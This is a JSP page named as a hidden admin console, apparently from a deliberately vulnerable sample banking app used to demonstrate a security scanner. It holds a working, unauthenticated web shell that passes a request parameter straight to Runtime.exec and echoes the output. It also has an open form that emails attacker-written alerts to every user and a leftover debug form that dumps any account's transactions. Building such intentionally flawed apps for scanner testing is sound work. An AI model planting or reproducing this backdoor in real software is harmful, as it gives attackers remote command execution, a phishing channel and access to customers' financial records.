<form method=get action='hidden_AdminControl.jsp'>
Shell Command<br />
<input name='actions' type=text size="80"><br/>
<input type=submit value='Execute'><br /><br />
Automated shutdown message (sent to everyone by default)<br />
<input name='message' type=text size="80"><br />
<p><i>Send to Specific Users (semicolon seperated list)</i><br />
<input name='users' type=text size="80"/><br/>
	
<input type=submit value='Broadcast Alert'>

<%@ page import="java.io.*" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.List" %>
<%@ page import="com.fortify.samples.riches.oper.*" %>
<%@ page import="com.fortify.samples.riches.model.*" %>

<% String alertMessage = request.getParameter("message");
   int messageCount = 0;
   
   if ((alertMessage != null) && (alertMessage.length() > 0))
	   {
	   SendMessage msgClass = new SendMessage();
	   String specifiedUsers = request.getParameter("users");
	   if ((specifiedUsers != null) && (specifiedUsers.length() > 0))
			{
			pageContext.getOut().print("<h1>Emergency Broadcast sent to users:</h1><pre>");
				
			String[] users = specifiedUsers.split(";");
			for (int index=0; index < users.length; index++)
				{
				String emailAddress = users[index];
				pageContext.getOut().println(emailAddress);
				
				msgClass.setTo(emailAddress);
				msgClass.setSubject("Technical Difficulties");
				
				String processedMessage = alertMessage.replaceAll("<code1>",
					"The system is currently experiencing technical difficulties.");
				
				msgClass.setBody(processedMessage);
				msgClass.setSeverity("Highest");
				msgClass.execute();
				messageCount++;
				}
			pageContext.getOut().println("</pre>");
			}
	   else
		   {
		   // Iterate through all users in the system
		   List emailAddresses = ProfileService.getAllEmail();
		   
		   for (Iterator it = emailAddresses.iterator(); it.hasNext();)
				{
			   String emailAddress = (String)it.next();
			   msgClass.setTo(emailAddress);
			   msgClass.setSubject("Technical Difficulties");
			   
			   String processedMessage = alertMessage.replaceAll("Code1",
					"The system is currently experiencing technical difficulties.");
			   
			   msgClass.setBody(processedMessage);
			   msgClass.setSeverity("Highest");
			   msgClass.execute();
			   messageCount++;
				}
		
			pageContext.getOut().flush();
			pageContext.getOut().println("<h1>Emergency Broadcast sent to <i>"+messageCount+"</i> users.</h1><br/>");
		   }
		}
%>
<%
   String cmd = request.getParameter("actions");

   if ((cmd != null) && (cmd.length() > 0))
   {
      String s = null;
      try 
	  {
	     String[] commands = cmd.split(";");
		 		 
		 for (int index=0; index < commands.length; index++)
		 {
			 String output = "";
			 String command = "";
		     command = commands[index];
			 
			 String runtimeCommand = "";
			 if (System.getProperty("os.name").startsWith("Windows"))
				runtimeCommand = "cmd.exe /C " + command;
			 else
			    runtimeCommand = command;
				
			 Process p = Runtime.getRuntime().exec(runtimeCommand);
			 BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
			 while((s = sI.readLine()) != null)
			 {
				output += s;
				output += "\r\n";
			 }
			 pageContext.getOut().flush();
			 pageContext.getOut().println("<h1>Response from command <i>"+command+"</i></h1><br/>");
			 pageContext.getOut().println("<pre>" + output + "</pre>");
		 }
      }
      catch(IOException e)
	  {
         
      }
   }
%>
<% 
   String accountNumber = request.getParameter("acctno");
   if ((accountNumber != null) && (accountNumber.length() > 0))
   {
		Long account = Long.valueOf(accountNumber);
		List transactions = TransactionService.getTransactions(account);
		
		pageContext.getOut().println("<h1>Transactions reported from database for account <i>"+accountNumber+"</i></h1>");
		
		try
		{
		for (Iterator it = transactions.iterator(); it.hasNext();)
				{
			    Transaction transaction = (Transaction)it.next();
				String transactionDescription = "Transaction reported ["+transaction.getId()+"]: "
				+ "Account "+ transaction.getAcctno() + "; "
				+ "Amount " + transaction.getAmount() + "; "
				+ "Date " + transaction.getDate() + "; "
				+ "Description " + transaction.getDescription();	
				
				pageContext.getOut().flush();
				pageContext.getOut().println("<pre>"+transactionDescription+"</pre>");
				}
		}
		catch (Exception e)
		{
		
		}
   }
%>
<br /><br /><b>Debug Code</b><br />
<i>Note: This code should be removed once debugging is complete for bug 192203 (inspection of database contents)</i><br />
Account Number <input name='acctno' type=text size="15"/><br />
<input type=submit value='Retrieve'>
</form>
